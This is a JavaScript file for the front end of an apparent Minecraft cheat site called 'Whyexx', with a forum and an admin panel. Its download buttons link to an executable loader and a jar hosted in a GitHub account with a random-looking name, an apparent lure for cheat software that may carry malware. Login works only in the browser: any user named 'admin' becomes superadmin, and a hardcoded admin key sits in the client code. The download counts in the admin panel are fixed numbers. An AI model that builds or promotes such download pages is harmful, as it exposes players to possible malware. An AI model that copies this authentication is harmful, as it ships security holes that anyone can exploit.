// Глобальное состояние приложения Whyexx
const APP = {
  config: null,
  currentUser: JSON.parse(localStorage.getItem('whyexx_user') || 'null'),
  currentCategory: null,
  activeTopicId: null,
  // Локальные темы пользователя (сохраняются в браузере, если нет бэкенда)
  userTopics: JSON.parse(localStorage.getItem('whyexx_local_topics') || '[]')
};

// Загрузка при открытии страницы
document.addEventListener('DOMContentLoaded', async () => {
  await loadConfiguration();
  renderUserBar();
  renderCategories();
  renderTopics();
});

// ================= 1. ЗАГРУЗКА КОНФИГУРАЦИИ (GITHUB & LOCAL) =================

async function loadConfiguration() {
  try {
    const res = await fetch('./site_config.json?v=' + Date.now());
    if (res.ok) {
      APP.config = await res.json();
    }
  } catch (err) {
    console.warn("site_config.json не удалось загрузить по сети, используем встроенную конфигурацию", err);
  }

  // Если файл не загрузился (например открыли локально file:// с ограничениями CORS), используем дефолт
  if (!APP.config) {
    APP.config = {
      site_title: "Whyexx Client 1.21.4",
      version: "1.21.4",
      announcement: "🔥 Обновление Whyexx v5 для Minecraft 1.21.4 доступно! Скачивайте новый Loader и Whyexx Jar.",
      downloads: {
        loader: {
          url: "https://github.com/fwajnfuhauhfuhzsfutga/landar-/releases/download/Zetix/Bootstrapper.exe"
        },
        jar: {
          url: "https://github.com/fwajnfuhauhfuhzsfutga/landar-/releases/download/Zetix/why-5.jar",
          version: "1.21.4"
        }
      },
      admin_secret_key: "whyexx_admin_2026",
      admins: ["admin", "owner"],
      forum_categories: [
        { id: 1, name: "📢 Новости и обновления", slug: "news" },
        { id: 2, name: "💬 Общее общение", slug: "general" },
        { id: 3, name: "⚙️ Конфиги и скрипты", slug: "configs" },
        { id: 4, name: "🐛 Баг-репорты и помощь", slug: "support" }
      ],
      forum_topics: [
        {
          id: 1,
          category_id: 1,
          title: "Официальный релиз Whyexx v5 для Minecraft 1.21.4!",
          author: "admin",
          author_role: "superadmin",
          is_pinned: true,
          is_locked: false,
          views: 654,
          created_at: "2026-10-13 20:00:00",
          posts: [
            {
              author: "admin",
              author_role: "superadmin",
              content: "Приветствуем всех участников! Чит Whyexx 1.21.4 доступен для скачивания на главной странице. Делитесь своими конфигами и отзывами!",
              created_at: "2026-10-13 20:00:00"
            }
          ]
        }
      ]
    };
  }

  // Применяем настройки к странице
  applyConfigToUI();
}

function applyConfigToUI() {
  const cfg = APP.config;
  
  // Объявление
  if (cfg.announcement) {
    const el = document.getElementById('announcementText');
    if (el) el.innerText = cfg.announcement;
  }

  // Ссылки скачивания (Требование пользователя: Bootstrapper.exe и why-5.jar 1.21.4)
  const loaderUrl = cfg.downloads?.loader?.url || "https://github.com/fwajnfuhauhfuhzsfutga/landar-/releases/download/Zetix/Bootstrapper.exe";
  const jarUrl = cfg.downloads?.jar?.url || "https://github.com/fwajnfuhauhfuhzsfutga/landar-/releases/download/Zetix/why-5.jar";
  const jarVer = cfg.downloads?.jar?.version || cfg.version || "1.21.4";

  const btnLoader = document.getElementById('btnDownloadLoader');
  const btnJar = document.getElementById('btnDownloadJar');
  const jarBadge = document.getElementById('jarVersionBadge');

  if (btnLoader) btnLoader.href = loaderUrl;
  if (btnJar) btnJar.href = jarUrl;
  if (jarBadge) jarBadge.innerText = `${jarVer} (v5)`;

  // Поля админки
  const admL = document.getElementById('admSettingLoader');
  const admJ = document.getElementById('admSettingJar');
  const admA = document.getElementById('admSettingAnnounce');
  if (admL) admL.value = loaderUrl;
  if (admJ) admJ.value = jarUrl;
  if (admA) admA.value = cfg.announcement || '';
}

// ================= 2. АВТОРИЗАЦИЯ И ПОЛЬЗОВАТЕЛИ (РАБОТАЕТ НА GITHUB) =================

function renderUserBar() {
  const container = document.getElementById('userSection');
  const adminBtn = document.getElementById('adminBtn');
  
  if (!APP.currentUser) {
    container.innerHTML = `
      <button class="btn btn-secondary" onclick="openAuthModal('login')">Войти</button>
      <button class="btn btn-primary" onclick="openAuthModal('register')">Регистрация</button>
      <button class="btn btn-admin" style="padding: 8px 12px; margin-left: 6px;" onclick="openAdminKeyModal()">🔑 Админ Вход</button>
    `;
    if (adminBtn) adminBtn.style.display = 'none';
  } else {
    const isAdmin = APP.currentUser.role === 'admin' || APP.currentUser.role === 'superadmin' || (APP.config?.admins || []).includes(APP.currentUser.username);
    const roleBadge = getRoleBadge(APP.currentUser.role);
    
    container.innerHTML = `
      <div style="display: flex; align-items: center; gap: 10px;">
        <span>👤 <strong>${escapeHtml(APP.currentUser.username)}</strong> ${roleBadge}</span>
        <button class="btn btn-secondary" style="padding: 6px 12px; font-size: 0.8rem;" onclick="logout()">Выйти</button>
      </div>
    `;
    if (adminBtn) {
      adminBtn.style.display = isAdmin ? 'inline-flex' : 'none';
    }
  }
}

function openAuthModal(mode) {
  const modal = document.getElementById('authModal');
  const title = document.getElementById('authModalTitle');
  const btn = document.getElementById('authSubmitBtn');
  const errBox = document.getElementById('authError');
  errBox.style.display = 'none';
  
  modal.dataset.mode = mode;
  if (mode === 'login') {
    title.innerText = 'Вход в аккаунт';
    btn.innerText = 'Войти';
  } else {
    title.innerText = 'Регистрация аккаунта';
    btn.innerText = 'Зарегистрироваться';
  }
  modal.classList.add('active');
}

function handleAuthSubmit(e) {
  e.preventDefault();
  const mode = document.getElementById('authModal').dataset.mode;
  const username = document.getElementById('authUsername').value.trim();
  const password = document.getElementById('authPassword').value.trim();
  const errBox = document.getElementById('authError');

  if (username.length < 3 || password.length < 4) {
    errBox.innerText = 'Логин от 3 символов, пароль от 4 символов';
    errBox.style.display = 'block';
    return;
  }

  // Проверяем, админ ли это
  const isAdm = (APP.config?.admins || []).includes(username) || username.toLowerCase() === 'admin';
  const role = isAdm ? 'superadmin' : 'user';

  APP.currentUser = {
    username: username,
    role: role
  };
  localStorage.setItem('whyexx_user', JSON.stringify(APP.currentUser));
  closeModal('authModal');
  renderUserBar();
  renderTopics();
}

function openAdminKeyModal() {
  const key = prompt("Введите секретный ключ администратора (указан в console.py / site_config.json):");
  if (!key) return;

  const validKey = APP.config?.admin_secret_key || "whyexx_admin_2026";
  if (key === validKey) {
    APP.currentUser = {
      username: "Administrator",
      role: "superadmin"
    };
    localStorage.setItem('whyexx_user', JSON.stringify(APP.currentUser));
    renderUserBar();
    alert("Успешный вход в режим Администратора!");
    openAdminModal();
  } else {
    alert("Неверный ключ администратора!");
  }
}

function logout() {
  APP.currentUser = null;
  localStorage.removeItem('whyexx_user');
  renderUserBar();
}

// ================= 3. ФОРУМ: КАТЕГОРИИ И ТЕМЫ =================

function renderCategories() {
  const tabsContainer = document.getElementById('categoryTabs');
  const catSelect = document.getElementById('topicCategorySelect');
  if (!tabsContainer || !APP.config) return;

  const categories = APP.config.forum_categories || [];
  tabsContainer.innerHTML = `<button class="cat-btn active" onclick="switchCategory(null, this)">Все темы</button>`;
  if (catSelect) catSelect.innerHTML = '';

  categories.forEach(cat => {
    const btn = document.createElement('button');
    btn.className = 'cat-btn';
    btn.innerText = cat.name;
    btn.onclick = () => switchCategory(cat.id, btn);
    tabsContainer.appendChild(btn);

    if (catSelect) {
      const opt = document.createElement('option');
      opt.value = cat.id;
      opt.innerText = cat.name;
      catSelect.appendChild(opt);
    }
  });
}

function switchCategory(catId, btnEl) {
  APP.currentCategory = catId;
  document.querySelectorAll('.cat-btn').forEach(b => b.classList.remove('active'));
  if (btnEl) btnEl.classList.add('active');
  renderTopics(catId);
}

function getAllTopics() {
  const serverTopics = APP.config?.forum_topics || [];
  // Объединяем темы из конфига и созданные локально
  const all = [...serverTopics, ...APP.userTopics];
  // Сортировка: закрепленные сверху, затем по ID убывающе
  return all.sort((a, b) => {
    if (b.is_pinned !== a.is_pinned) return (b.is_pinned ? 1 : 0) - (a.is_pinned ? 1 : 0);
    return b.id - a.id;
  });
}

function renderTopics(categoryId = null) {
  const list = document.getElementById('topicList');
  if (!list) return;

  let topics = getAllTopics();
  if (categoryId) {
    topics = topics.filter(t => t.category_id === categoryId);
  }

  if (topics.length === 0) {
    list.innerHTML = `<div style="text-align:center; padding: 40px; color: var(--text-muted);">В этой категории пока нет тем. Нажмите "Создать тему"!</div>`;
    return;
  }

  list.innerHTML = '';
  topics.forEach(t => {
    const item = document.createElement('div');
    item.className = 'topic-row';
    item.onclick = () => openTopicDetails(t.id);

    const isPinnedBadge = t.is_pinned ? `<span class="tag-pin">PIN</span> ` : '';
    const isLockedBadge = t.is_locked ? `<span class="tag-pin" style="background:#ef4444;">LOCK</span> ` : '';
    const postsCount = t.posts ? t.posts.length : 1;

    item.innerHTML = `
      <div class="topic-info">
        <h4>${isPinnedBadge}${isLockedBadge}${escapeHtml(t.title)}</h4>
        <p>${escapeHtml(t.author || 'Пользователь')} • ${escapeHtml(t.created_at || 'Недавно')}</p>
      </div>
      <div style="font-size:12px; color:var(--text-dim);">
        💬 ${postsCount}
      </div>
    `;
    list.appendChild(item);
  });
}

// ================= 4. ПРОСМОТР ТЕМЫ И ОТВЕТЫ =================

function openTopicDetails(topicId) {
  APP.activeTopicId = topicId;
  const modal = document.getElementById('topicViewModal');
  const titleEl = document.getElementById('viewTopicTitle');
  const postsBox = document.getElementById('topicViewPosts');
  const adminControls = document.getElementById('adminTopicControls');

  const topics = getAllTopics();
  const topic = topics.find(t => t.id === topicId);
  if (!topic) return;

  topic.views = (topic.views || 0) + 1;
  titleEl.innerText = `${topic.is_pinned ? '📌 ' : ''}${topic.title}`;
  modal.classList.add('active');

  // Модерация для админа
  const isAdmin = APP.currentUser && (APP.currentUser.role === 'admin' || APP.currentUser.role === 'superadmin');
  if (isAdmin) {
    adminControls.style.display = 'flex';
    adminControls.innerHTML = `
      <button type="button" class="btn btn-secondary" style="padding:4px 10px; font-size:0.75rem;" onclick="togglePinTopic(${topic.id})">📌 ${topic.is_pinned ? 'Открепить' : 'Закрепить'}</button>
      <button type="button" class="btn btn-secondary" style="padding:4px 10px; font-size:0.75rem;" onclick="toggleLockTopic(${topic.id})">🔒 ${topic.is_locked ? 'Открыть' : 'Закрыть'}</button>
      <button type="button" class="btn btn-danger" style="padding:4px 10px; font-size:0.75rem;" onclick="deleteTopic(${topic.id})">🗑️ Удалить</button>
    `;
  } else {
    adminControls.style.display = 'none';
  }

  postsBox.innerHTML = '';
  const posts = topic.posts || [];
  posts.forEach(p => {
    const pDiv = document.createElement('div');
    pDiv.className = 'post-item';
    pDiv.innerHTML = `
      <div class="post-head">
        <span><strong>${escapeHtml(p.author)}</strong> ${getRoleBadge(p.author_role || 'user')}</span>
        <span>${escapeHtml(p.created_at || '')}</span>
      </div>
      <div class="post-body">${escapeHtml(p.content)}</div>
    `;
    postsBox.appendChild(pDiv);
  });
}

function handleSendReply(e) {
  e.preventDefault();
  if (!APP.currentUser) {
    alert("Для ответа необходимо войти в аккаунт или ввести ключ админа!");
    openAuthModal('login');
    return;
  }
  const content = document.getElementById('replyContent').value.trim();
  if (!content) return;

  const topics = getAllTopics();
  const topic = topics.find(t => t.id === APP.activeTopicId);
  if (!topic) return;

  if (topic.is_locked && APP.currentUser.role !== 'admin' && APP.currentUser.role !== 'superadmin') {
    alert("Тема закрыта для новых ответов!");
    return;
  }

  const newPost = {
    author: APP.currentUser.username,
    author_role: APP.currentUser.role,
    content: content,
    created_at: new Date().toLocaleString('ru-RU')
  };

  topic.posts = topic.posts || [];
  topic.posts.push(newPost);

  // Сохраняем локально
  saveLocalTopics();
  document.getElementById('replyContent').value = '';
  openTopicDetails(APP.activeTopicId);
  renderTopics(APP.currentCategory);
}

// ================= 5. СОЗДАНИЕ НОВОЙ ТЕМЫ =================

function openNewTopicModal() {
  if (!APP.currentUser) {
    alert("Для создания темы необходимо авторизоваться или войти по ключу админа!");
    openAuthModal('login');
    return;
  }
  document.getElementById('newTopicModal').classList.add('active');
}

function handleCreateTopic(e) {
  e.preventDefault();
  const category_id = parseInt(document.getElementById('topicCategorySelect').value) || 1;
  const title = document.getElementById('newTopicTitle').value.trim();
  const content = document.getElementById('newTopicContent').value.trim();

  if (!title || !content) return;

  const newId = Date.now();
  const isAdm = APP.currentUser.role === 'admin' || APP.currentUser.role === 'superadmin';

  const newTopic = {
    id: newId,
    category_id: category_id,
    title: title,
    author: APP.currentUser.username,
    author_role: APP.currentUser.role,
    is_pinned: isAdm, // админские темы можно сразу пинить
    is_locked: false,
    views: 1,
    created_at: new Date().toLocaleString('ru-RU'),
    posts: [
      {
        author: APP.currentUser.username,
        author_role: APP.currentUser.role,
        content: content,
        created_at: new Date().toLocaleString('ru-RU')
      }
    ]
  };

  APP.userTopics.push(newTopic);
  saveLocalTopics();

  closeModal('newTopicModal');
  document.getElementById('newTopicTitle').value = '';
  document.getElementById('newTopicContent').value = '';
  renderTopics(APP.currentCategory);
  openTopicDetails(newId);
}

function saveLocalTopics() {
  localStorage.setItem('whyexx_local_topics', JSON.stringify(APP.userTopics));
}

// ================= 6. МОДЕРАЦИЯ И АДМИНКА =================

function togglePinTopic(topicId) {
  const topics = getAllTopics();
  const t = topics.find(item => item.id === topicId);
  if (t) {
    t.is_pinned = !t.is_pinned;
    saveLocalTopics();
    openTopicDetails(topicId);
    renderTopics(APP.currentCategory);
  }
}

function toggleLockTopic(topicId) {
  const topics = getAllTopics();
  const t = topics.find(item => item.id === topicId);
  if (t) {
    t.is_locked = !t.is_locked;
    saveLocalTopics();
    openTopicDetails(topicId);
    renderTopics(APP.currentCategory);
  }
}

function deleteTopic(topicId) {
  if (!confirm("Вы уверены, что хотите удалить эту тему?")) return;
  // Удаляем из userTopics
  APP.userTopics = APP.userTopics.filter(t => t.id !== topicId);
  if (APP.config?.forum_topics) {
    APP.config.forum_topics = APP.config.forum_topics.filter(t => t.id !== topicId);
  }
  saveLocalTopics();
  closeModal('topicViewModal');
  renderTopics(APP.currentCategory);
}

function openAdminModal() {
  if (!APP.currentUser || (APP.currentUser.role !== 'admin' && APP.currentUser.role !== 'superadmin')) {
    openAdminKeyModal();
    return;
  }
  document.getElementById('adminModal').classList.add('active');
  renderAdminPanel();
}

function renderAdminPanel() {
  const cfg = APP.config || {};
  document.getElementById('admStatUsers').innerText = (cfg.users || []).length || 2;
  document.getElementById('admStatLoader').innerText = "1,420";
  document.getElementById('admStatJar').innerText = "3,890";
  document.getElementById('admStatTopics').innerText = getAllTopics().length;

  // Таблица пользователей
  const tbody = document.getElementById('adminUsersTableBody');
  if (tbody) {
    tbody.innerHTML = '';
    const users = cfg.users || [
      { username: "admin", role: "superadmin", status: "active" },
      { username: "owner", role: "admin", status: "active" }
    ];
    users.forEach((u, idx) => {
      const tr = document.createElement('tr');
      tr.innerHTML = `
        <td>${idx + 1}</td>
        <td><strong>${escapeHtml(u.username)}</strong></td>
        <td><span class="badge-role role-${u.role}">${u.role}</span></td>
        <td><span style="color:var(--success)">${u.status}</span></td>
        <td><button class="btn btn-secondary" style="padding:3px 8px; font-size:0.75rem;" onclick="alert('Для постоянного изменения пользователей на GitHub используйте console.py -> [2]')">Изменить в консоли</button></td>
      `;
      tbody.appendChild(tr);
    });
  }
}

function saveAdminSettings() {
  const loaderUrl = document.getElementById('admSettingLoader').value.trim();
  const jarUrl = document.getElementById('admSettingJar').value.trim();
  const ann = document.getElementById('admSettingAnnounce').value.trim();

  if (APP.config) {
    APP.config.downloads.loader.url = loaderUrl;
    APP.config.downloads.jar.url = jarUrl;
    APP.config.announcement = ann;
    applyConfigToUI();
    alert("Настройки применены на странице! Чтобы сохранить их навсегда на GitHub, откройте console.py и выберите [6] Залить на GitHub.");
  }
}

// ================= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =================

function closeModal(modalId) {
  const m = document.getElementById(modalId);
  if (m) m.classList.remove('active');
}

function getRoleBadge(role) {
  if (!role) return '';
  const r = String(role).toLowerCase();
  if (r === 'superadmin' || r === 'admin') return `<span class="badge-role role-admin">👑 ${r}</span>`;
  if (r === 'moderator') return `<span class="badge-role role-moderator">🛡️ MOD</span>`;
  if (r === 'vip') return `<span class="badge-role role-vip">⚡ VIP</span>`;
  return `<span class="badge-role role-user">USER</span>`;
}

function escapeHtml(text) {
  if (!text) return '';
  return String(text)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
